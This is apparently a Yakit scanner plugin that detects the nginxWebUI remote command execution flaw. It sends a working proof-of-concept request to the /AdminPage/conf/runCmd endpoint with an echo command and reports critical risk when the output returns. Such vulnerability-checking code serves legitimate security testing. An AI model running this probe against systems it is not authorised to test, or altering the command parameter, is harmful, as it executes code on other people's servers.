// Author: 沈少
# port scan plugin
yakit.AutoInitYakit()

handleCheck = func(target, port){
    var url
    addr = str.HostPort(target, port)
    isTls = str.IsTLSServer(addr)
    if isTls {
        url="https://"+addr
    } else {
        url="http://"+addr
    }
    vulnable = false

    reference = "nginxWebUI 远程命令执行漏洞"
    severity = "critical"
    type = "漏洞"

    poc_url = url + "/AdminPage/conf/runCmd?cmd=echo%20aaaa%27%27bbbb"
    req, _ := http.NewRequest("GET", poc_url, http.noredirect())
    breq, _ = http.dump(req)
    resp, err := http.Do(req)
    die(err)
    bresp, _ = http.dump(resp)
    header, body = poc.Split(bresp)

    if resp.StatusCode == 200 && str.Contains(string(body), "aaaabbbb") {
        vulnable = true
    }

    if vulnable {
        yakit.Info("FOUND INFO for %v %v", reference, type)
        risk.NewRisk(
            url, risk.severity(severity), 
            risk.title(sprintf("Found %v %v", reference, type)),
            risk.titleVerbose(sprintf("%v %v", reference, type)),
            risk.type(type), risk.typeVerbose(type),
            risk.details({
                "request": breq,
                "response": bresp,
                "url": poc_url,
            }),
        )
    }
    return
}

handle = func(result) {
    if !result.IsOpen(){
        return
    }
    if len(result.Fingerprint.HttpFlows) > 0 {
        handleCheck(result.Target, result.Port)
    }
}
